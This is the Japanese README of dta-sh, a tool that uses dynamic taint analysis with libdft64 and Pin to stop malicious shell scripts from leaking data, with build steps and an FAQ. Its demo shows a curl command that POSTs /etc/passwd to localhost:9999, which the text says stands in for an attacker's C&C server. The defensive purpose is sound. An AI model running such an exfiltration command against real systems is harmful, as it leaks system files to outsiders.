# 動的テイント解析を用いた悪性シェルスクリプトによる情報漏洩の阻止

dta-sh は動的テイント解析を用いて悪性シェルスクリプトによる情報漏洩を阻止するためのツール。
動的テイント解析には[libdft64](https://github.com/AngoraFuzzer/libdft64)を用いる。

## クイックスタート
`/etc/passwd`を外部に漏洩させるシェルスクリプトスクリプトの漏洩を阻止するデモ。
このシェルスクリプトはcurlコマンドを使用してPOSTリクエストで外部にファイルを送信する。
`src/sendfile.sh`にある。
```bash
# 情報漏洩を行うコマンド
curl -X POST -F f=@"/etc/passwd" localhost:9999
```
ファイルの送信先（漏洩先）は自分自身とする。
本来localhost:9999の部分は攻撃者が用意するC&Cサーバのドメイン名であるが、漏洩させるファイルを自身で受け取るためここではlocalhostとなる。

### デモの実行方法
```bash
# 依存関係をインストール（初回のみ）
./setup.sh

# 環境変数(PIN_ROOT)を設定
source ./env.init

# POSTリクエストを受け取るHTTPサーバを起動
python3 server.py &

# dta-shをビルド
cd src
make

# デモを実行
make test
```
ログがたくさん出て、最終的に`[pid 93112] alert           : !!!! ABORT !!!!    Data leak detected`と出力されたらこのデモは成功。
うまく行かない場合は[FAQ](#FAQ)を参照。

### dta-shを使わない場合
作成したツール dta-sh を使わない場合どうなるか確認。
単に`sendfile.sh`を実行する。
```bash
./sendfile.sh
```
先程サーバを起動したターミナルに戻ると、赤文字の`/etc/passwd`の内容が出力されているはず。
これはサーバが受け取ったデータで、POSTリクエストにより`/etc/passwd`の内容が漏洩した。

## FAQ
エラーに関するものは起きたエラーがそのままタイトル。

### Makefile:18: /Config/makefile.default.rules: No such file or directory
[`PIN_ROOT`](#PIN_ROOTとは)が設定されておらず、PinのMakefileが見つからない。
Pinのディレクトリを環境変数経由で教えてやる。

```bash
source env.init
```

### dta-sh.cpp:58:15: error: unused variable 'sockfd' [-Werror=unused-variable]
Pintoolのコンパイルに`-Werror`が有効なため、WarningがすべてErrorとして扱われる。
Pintoolのコンパイルオプションはpin-3.20-98437-gf02b61307-gcc-linux/source/tools/Config/makefile.unix.configで定義されているため、`-Werror`を削除することでコンパイルが通る（WarningはWarningとして扱われる）。

```diff
- TOOL_CXXFLAGS_NOOPT := -Wall -Werror -Wno-unknown-pragmas -DPIN_CRT=1
+ TOOL_CXXFLAGS_NOOPT := -Wall -Wno-unknown-pragmas -DPIN_CRT=1
```

### likely()/unlikely()
条件分岐を最適化するためにコンパイラに与えるヒント。
libdft64/src/branch_pred.hで定義されている。

ref. https://stackoverflow.com/questions/109710/how-do-the-likely-unlikely-macros-in-the-linux-kernel-work-and-what-is-their-ben

### curl: (7) Failed to connect to localhost port 9999 after 468 ms: Connection refused
ローカルサーバが立っていない。
サーバを立ててやる。`&`はバックグラウンド実行の意味（Bashの機能）。

```
python3 server.py &
```

### PIN_ROOTとは
libdft64にPinのパスを教えるための環境変数。
make時、libdft64はこの変数を読んでpin.Hなりの場所を知る。

ref. https://software.intel.com/sites/landingpage/pintool/docs/98650/Pin/doc/html/index.html#UsefulVariables

### なぜMakefileとmakefile.rulesの2つがあるのか
Makefileは設定（ビルド用の変数`CXX := g++`など）を読み込む、ビルドレシピを読み込むファイル、
makefile.rulesはビルドするlibdft toolを定義するファイル。
Makefileは編集せず、makefile.rulesにのみビルドするlibdft toolを定義する。
変数などが隠されていて分かりにくい部分もあるが、libdft64/toolsのビルド方法をそのまま採用した。

### libdft tool（dta-sh.cppなど）のビルドレシピの場所
libdft toolを作る場合は、明示的にツールのビルドレシピを定義しなくてよい。
makefile.rulesの`TOOL_ROOT`にビルドするツールのファイル名（の拡張子を取ったもの）を定義するだけ。
詳細なビルドレシピは別の場所で定義されていて隠されている。
例えば、dta-sh.cppというlibdft toolをビルドするためには`TOOL_ROOT := dta-sh`と定義する。
するとmakeを実行するだけでobj-intel64/dta-sh.soというファイルが生成される。

### コールバック関数のTHREADIDとは
本ツールでは使わない。
THREADIDはPinのスレッドが使用するデータの配列へのインデックス。
ここでのスレッドはWinAPIのスレッドやPthreadsのスレッドではなく、Pinが管理するスレッド。

> Pin also provides an analysis routine argument (IARG_THREAD_ID), which passes a Pin-specific thread ID for the calling thread. This ID is different from the O/S system thread ID, and is a small number starting at 0, which can be used as an index to an array of thread data or as the locking value to Pin user locks. See the example Instrumenting Threaded Applications for more information.

ref. https://software.intel.com/sites/landingpage/pintool/docs/98650/Pin/doc/html/index.html#MT
